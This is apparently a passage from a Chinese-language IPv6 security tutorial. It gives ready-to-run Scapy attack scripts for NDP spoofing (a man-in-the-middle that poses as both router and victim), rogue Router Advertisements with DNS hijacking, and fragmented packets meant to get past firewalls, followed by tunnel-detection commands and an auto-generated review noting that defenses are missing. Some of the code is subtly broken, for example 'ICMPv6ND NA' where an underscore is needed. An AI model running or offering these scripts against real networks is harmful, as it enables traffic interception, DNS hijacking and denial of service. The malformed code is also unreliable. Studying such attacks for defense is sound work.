# IPv6安全威胁

### 2.1 NDP欺骗（Neighbor Discovery Protocol Spoofing）

NDP（邻居发现协议）是IPv6中替代ARP的协议，用于在同一链路上发现邻居和路由器。NDP使用ICMPv6消息：

- RS（Router Solicitation，路由器请求）
- RA（Router Advertisement，路由器通告）
- NS（Neighbor Solicitation，邻居请求）
- NA（Neighbor Advertisement，邻居通告）
- Redirect（重定向）

**NDP欺骗原理：**

与IPv4 ARP欺骗类似，攻击者伪造NA消息，声称自己拥有某个IPv6地址的MAC地址，从而导致流量被重定向。

```
攻击场景：中间人攻击

正常情况：
  Victim ──────────────────────── Router
  (2001:db8::100)               (2001:db8::1)

攻击后：
  Victim ────→ Attacker ────→ Router
  (2001:db8::100)  (2001:db8::999)  (2001:db8::1)

攻击步骤：
1. 攻击者发送伪造NA消息给Victim
   "2001:db8::1的MAC地址是 Attacker_MAC"
2. 攻击者发送伪造NA消息给Router
   "2001:db8::100的MAC地址是 Attacker_MAC"
3. 所有流量经过攻击者
```

**攻击工具实现（使用Scapy）：**

```python
from scapy.all import *
import time

# 目标和攻击者信息
victim_ip = "2001:db8::100"
victim_mac = "00:11:22:33:44:55"
router_ip = "2001:db8::1"
router_mac = "00:aa:bb:cc:dd:ee"
attacker_mac = "00:66:77:88:99:aa"

def ndp_spoof():
    """IPv6 NDP欺骗 - 冒充路由器"""
    while True:
        # 构造NA消息给受害者（声称自己是路由器）
        na_to_victim = (
            Ether(dst=victim_mac, src=attacker_mac) /
            IPv6(src=router_ip, dst=victim_ip) /
            ICMPv6ND NA(
                R=1,  # Router flag
                S=0,  # Solicited flag
                O=1,  # Override flag
            ) /
            ICMPv6NDOptDstLLAddr(lladdr=attacker_mac)
        )

        # 构造NA消息给路由器（声称自己是受害者）
        na_to_router = (
            Ether(dst=router_mac, src=attacker_mac) /
            IPv6(src=victim_ip, dst=router_ip) /
            ICMPv6ND NA(R=0, S=0, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=attacker_mac)
        )

        sendp(na_to_victim, verbose=0)
        sendp(na_to_router, verbose=0)

        print("[*] NDP spoof packets sent")
        time.sleep(2)

if __name__ == "__main__":
    ndp_spoof()
```

### 2.2 RA攻击（Router Advertisement Attack）

RA攻击是指攻击者在网络中发送伪造的路由器通告（RA）消息，使客户端将攻击者设为默认网关。

```
RA攻击场景：

1. 流量劫持：
   攻击者发送RA消息 → 客户端将攻击者设为默认网关
   → 所有外出流量经过攻击者

2. 拒绝服务：
   攻击者发送RA消息但不转发数据包
   → 客户端无法访问外部网络

3. DNS劫持：
   RA消息中包含RDNSS选项
   → 客户端使用攻击者的DNS服务器
```

**伪造RA消息攻击脚本：**

```python
from scapy.all import *

def rogue_ra_attack():
    """发送伪造RA消息"""
    # 攻击者信息
    attacker_mac = "00:66:77:88:99:aa"
    fake_prefix = "2001:db8:dead::"
    fake_dns = "2001:db8:dead::53"

    # 构造RA消息
    ra_packet = (
        Ether(src=attacker_mac, dst="33:33:00:00:00:01") /  # 组播地址
        IPv6(src="fe80::6677:88ff:fe99:aa",
             dst="ff02::1") /  # 所有节点组播
        ICMPv6ND RA(
            Hops=64,
            M=0,  # Managed address config
            O=1,  # Other config flag
            RouterLifetime=1800,
            ReachableTime=0,
            RetransTimer=0,
        ) /
        ICMPv6NDOptPrefixInfo(
            type=3,
            len=4,
            prefixlen=64,
            L=1,  # On-link
            A=1,  # Autonomous address config
            validlifetime=86400,
            preferredlifetime=14400,
            prefix=fake_prefix
        ) /
        ICMPv6NDOptRDNSS(
            type=25,
            len=1,
            lifetime=86400,
            dns=[fake_dns]
        ) /
        ICMPv6NDOptSrcLLAddr(lladdr=attacker_mac)
    )

    sendp(ra_packet, loop=1, inter=3, verbose=1)

if __name__ == "__main__":
    rogue_ra_attack()
```

### 2.3 碎片攻击

IPv6的分片机制与IPv4不同，路由器不再分片，只有源端进行分片（通过Path MTU Discovery确定MTU）。分片信息包含在Fragment扩展报头中。

**碎片攻击类型：**

1. **碎片重叠攻击**：利用碎片偏移重叠，绕过防火墙检测
2. **碎片资源耗尽**：发送大量碎片包但不完成重组
3. **碎片绕过防火墙**：将攻击载荷分片，使防火墙无法检测完整内容

```python
from scapy.all import *

def ipv6_fragment_attack(target_ip):
    """IPv6碎片绕过防火墙攻击"""
    # 构造TCP SYN包并分片
    # 第一个碎片
    frag1 = (
        IPv6(dst=target_ip) /
        IPv6ExtHdrFragment(offset=0, m=1, id=0x1234) /
        TCP(dport=80, flags="S", seq=1000)[:16]  # 只取前16字节
    )

    # 第二个碎片（包含攻击载荷）
    frag2 = (
        IPv6(dst=target_ip) /
        IPv6ExtHdrFragment(offset=2, m=0, id=0x1234) /
        b"\x00\x00\x00\x00\x50\x02\x00\x00\x00\x00\x00\x00"  # 剩余TCP头部
    )

    send(frag1)
    send(frag2)
    print(f"[*] Fragmented packets sent to {target_ip}")
```

### 2.4 隧道攻击

IPv6-over-IPv4隧道机制（如6to4、6rd、Teredo、ISATAP）可能被利用来绕过IPv4安全控制。

```
隧道攻击场景：

1. 绕过IPv4防火墙：
   攻击者 ←IPv6 over UDP→ Teredo服务器 ←IPv6→ 目标

2. 绕过NAT：
   内部主机通过ISATAP隧道访问外部IPv6网络
   → 绕过IPv4 NAT规则

3. 隐蔽通信：
   使用6to4隧道封装恶意流量
   → IPv4 IDS/IPS可能无法检测
```

**检测IPv6隧道：**

```bash
# 检查系统是否启用了IPv6隧道
ip -6 tunnel show
ip -6 addr show

# 检查Teredo
netsh interface teredo show state  # Windows
netsh interface ipv6 show teredo

# 检查ISATAP
netsh interface ipv6 show isatap

# Linux检查6to4
ip -6 route show | grep "::/96"
```

---

---

## 📋 内容审核与补充建议

> 针对「IPv6安全威胁」部分的内容审核结果：

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
